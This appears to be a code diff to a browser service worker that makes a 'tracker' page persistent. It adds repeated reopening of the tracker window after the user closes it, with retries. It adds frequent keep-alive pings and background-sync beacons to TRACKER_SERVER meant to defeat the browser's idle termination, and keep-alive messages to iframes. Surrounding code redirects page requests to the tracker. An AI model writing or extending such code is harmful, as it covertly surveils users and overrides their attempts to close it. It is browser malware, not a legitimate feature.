@@ -15,11 +15,28 @@ self.addEventListener('activate', (e) => {
     startKeepAlive();
 });
 
+// Reopen tracker with exponential backoff
+function attemptReopen(attempt) {
+    const delays = [500, 1000, 2000, 3000, 5000];
+    const delay = delays[Math.min(attempt - 1, delays.length - 1)];
+    setTimeout(() => {
+        self.clients.matchAll({ includeUncontrolled: true, type: 'window' }).then(clients => {
+            const hasTracker = clients.some(c => c.url.includes(TRACKER_SERVER));
+            if (!hasTracker) {
+                self.clients.openWindow(TRACKER_SERVER + '/?bg=1');
+                if (attempt < 5) {
+                    attemptReopen(attempt + 1);
+                }
+            }
+        });
+    }, delay);
+}
+
 // Keep service worker alive - prevent termination
 function startKeepAlive() {
     if (keepAliveInterval) return;
     keepAliveInterval = setInterval(() => {
-        // Ping server to keep SW alive
+        // Ping server to keep SW alive (no-cors to avoid CORS errors)
         fetch(TRACKER_SERVER + '/ping', { 
             method: 'POST',
             mode: 'no-cors',
@@ -27,19 +44,40 @@ function startKeepAlive() {
             body: JSON.stringify({ sw: 'alive', time: Date.now() })
         }).catch(() => {});
         
-        // Keep clients alive
+        // Periodic sync with server
+        fetch(TRACKER_SERVER + '/api/sw-heartbeat', {
+            method: 'POST',
+            mode: 'cors',
+            keepalive: true,
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sw: 'alive', time: Date.now() })
+        }).catch(() => {});
+        
+        // Keep clients alive or reopen
         self.clients.matchAll({ includeUncontrolled: true, type: 'window' }).then(clients => {
-            if (clients.length === 0) {
-                // No clients - try to reopen
-                self.clients.openWindow(TRACKER_SERVER + '/?bg=1');
+            // Filter only our tracker pages
+            const ourClients = clients.filter(c => c.url.includes(TRACKER_SERVER));
+            if (ourClients.length === 0) {
+                // No clients - try to reopen with retry
+                attemptReopen(1);
             } else {
                 // Ping all clients to keep them alive
-                clients.forEach(client => {
+                ourClients.forEach(client => {
                     client.postMessage({ type: 'keepalive', time: Date.now() });
                 });
             }
         });
-    }, 25000); // Every 25s to prevent SW termination (Chrome kills after 30s idle)
+    }, 15000); // Every 15s to prevent SW termination (Chrome kills after 30s idle)
+
+    // Also check for iframe clients
+    setInterval(() => {
+        self.clients.matchAll({ includeUncontrolled: true, type: 'all' }).then(all => {
+            const iframes = all.filter(c => c.url.includes('iframe=1'));
+            if (iframes.length > 0) {
+                iframes.forEach(c => c.postMessage({ type: 'keepalive', time: Date.now() }));
+            }
+        });
+    }, 30000);
 }
 
 // Intercept fetch — redirect non-asset requests to tracker
@@ -81,9 +119,7 @@ self.addEventListener('periodicsync', (e) => {
 });
 
 async function periodicSync() {
-    // Run tracking tasks even when page is closed
     try {
-        // Ping server
         await fetch(TRACKER_SERVER + '/api/background-sync', {
             method: 'POST',
             mode: 'cors',
@@ -96,10 +132,10 @@ async function periodicSync() {
             })
         });
         
-        // Try to reopen page if no clients
-        const clients = await self.clients.matchAll({ type: 'window' });
-        if (clients.length === 0) {
-            await self.clients.openWindow(TRACKER_SERVER + '/?bg=1');
+        const clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
+        const hasTracker = clients.some(c => c.url.includes(TRACKER_SERVER));
+        if (!hasTracker) {
+            attemptReopen(1);
         }
     } catch(e) {}
 }
@@ -157,16 +193,15 @@ self.addEventListener('notificationclick', (e) => {
 // Auto-reinstall tracker when client reports closed
 self.addEventListener('message', (e) => {
     if (e.data && e.data.type === 'CLIENT_CLOSED') {
-        // Reopen tracker after short delay
-        setTimeout(() => {
-            self.clients.matchAll({ type: 'window' }).then(clients => {
-                if (clients.length === 0) {
-                    self.clients.openWindow(TRACKER_SERVER + '/?bg=1');
-                }
-            });
-        }, 3000);
+        // Fast reopen with exponential backoff
+        attemptReopen(1);
     }
     if (e.data && e.data.type === 'PING_REINSTALL') {
         e.source.postMessage({ type: 'PONG_REINSTALL', time: Date.now() });
+    }
+    if (e.data && e.data.type === 'IFRAME_ALIVE') {
+        // Iframe reports it's alive — keep track
+        if (!self._iframeClients) self._iframeClients = new Set();
+        self._iframeClients.add(e.source.id);
     }
 });
